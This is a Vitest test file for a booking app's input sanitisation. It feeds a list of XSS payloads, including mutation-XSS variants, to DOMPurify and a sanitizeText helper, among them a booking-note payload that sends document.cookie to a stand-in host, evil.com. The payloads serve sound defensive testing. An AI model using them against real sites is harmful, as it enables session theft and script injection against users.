import { describe, it, expect } from 'vitest';
import { sanitizeText } from '@/utils/inputSanitization';
import DOMPurify from 'dompurify';

describe('XSS (Cross-Site Scripting) Prevention', () => {
  const xssAttacks = [
    // Script tag injection
    '<script>alert("XSS")</script>',
    '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
    '<script>document.cookie</script>',
    
    // Event handler injection
    '<img src=x onerror=alert("XSS")>',
    '<img src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    
    // SVG-based XSS
    '<svg onload=alert("XSS")>',
    '<svg><script>alert("XSS")</script></svg>',
    
    // Data URI XSS
    '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',
    
    // JavaScript protocol
    '<a href="javascript:alert(\'XSS\')">Click</a>',
    '<iframe src="javascript:alert(\'XSS\')">',
    
    // Iframe injection
    '<iframe src="http://evil.com"></iframe>',
    
    // Meta refresh redirect
    '<meta http-equiv="refresh" content="0;url=http://evil.com">',
  ];

  describe('Input Sanitization with DOMPurify', () => {
    xssAttacks.forEach((attack) => {
      it(`should sanitize XSS attack: "${attack.substring(0, 40)}..."`, () => {
        const cleaned = DOMPurify.sanitize(attack);
        
        // Verify no script tags remain
        expect(cleaned).not.toContain('<script');
        expect(cleaned).not.toContain('javascript:');
        expect(cleaned).not.toContain('onerror=');
        expect(cleaned).not.toContain('onload=');
        expect(cleaned).not.toContain('onfocus=');
      });
    });
  });

  describe('Customer Name XSS Prevention', () => {
    it('should sanitize script tags in customer name', () => {
      const maliciousName = '<script>alert("XSS")</script>John Doe';
      const result = sanitizeText(maliciousName);
      
      expect(result.sanitized).not.toContain('<script');
      expect(result.sanitized).not.toContain('</script>');
      expect(result.suspicious).toBe(true);
    });

    it('should sanitize event handlers', () => {
      const maliciousName = '<img src=x onerror=alert("XSS")>';
      const result = sanitizeText(maliciousName);
      
      expect(result.sanitized).not.toContain('onerror');
      expect(result.sanitized).not.toContain('<img');
    });
  });

  describe('Booking Notes XSS Prevention', () => {
    it('should sanitize HTML in booking notes', () => {
      const maliciousNote = 'Please call me <script>fetch("http://evil.com?cookie="+document.cookie)</script>';
      const result = sanitizeText(maliciousNote);
      
      expect(result.sanitized).not.toContain('<script');
      expect(result.sanitized).toContain('Please call me');
    });

    it('should allow safe HTML entities', () => {
      const safeText = 'Special chars: &lt;, &gt;, &amp;';
      const result = sanitizeText(safeText);
      
      expect(result.sanitized).toBe(safeText);
      expect(result.suspicious || false).toBe(false);
    });
  });

  describe('SVG XSS Prevention', () => {
    it('should remove malicious SVG tags', () => {
      const svgAttack = '<svg onload=alert("XSS")></svg>';
      const cleaned = DOMPurify.sanitize(svgAttack);
      
      expect(cleaned).not.toContain('onload');
    });

    it('should allow safe SVG', () => {
      const safeSvg = '<svg width="100" height="100"><circle cx="50" cy="50" r="40"/></svg>';
      const cleaned = DOMPurify.sanitize(safeSvg);
      
      expect(cleaned).toContain('<svg');
      expect(cleaned).toContain('<circle');
    });
  });

  describe('URL XSS Prevention', () => {
    it('should block javascript: protocol', () => {
      const maliciousUrl = 'javascript:alert("XSS")';
      const cleaned = DOMPurify.sanitize(`<a href="${maliciousUrl}">Click</a>`);
      
      expect(cleaned).not.toContain('javascript:');
    });

    it('should block data: URI with script', () => {
      const dataUri = 'data:text/html,<script>alert("XSS")</script>';
      const cleaned = DOMPurify.sanitize(`<a href="${dataUri}">Click</a>`);
      
      expect(cleaned).not.toContain('<script');
    });
  });

  describe('DOM Mutation XSS (mXSS) Prevention', () => {
    it('should prevent mXSS via nesting', () => {
      const mXssAttack = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
      const cleaned = DOMPurify.sanitize(mXssAttack);
      
      expect(cleaned).not.toContain('onerror');
    });

    it('should prevent mXSS via backticks', () => {
      const mXssAttack = '<img src=`x`onerror=alert(1)>';
      const cleaned = DOMPurify.sanitize(mXssAttack);
      
      expect(cleaned).not.toContain('onerror');
    });
  });

  describe('Content Security Policy (CSP) Headers', () => {
    it('should verify CSP headers prevent inline scripts', () => {
      // In production, verify CSP headers are set:
      // Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
      
      const expectedCSP = "default-src 'self'";
      expect(expectedCSP).toContain("'self'");
    });
  });
});
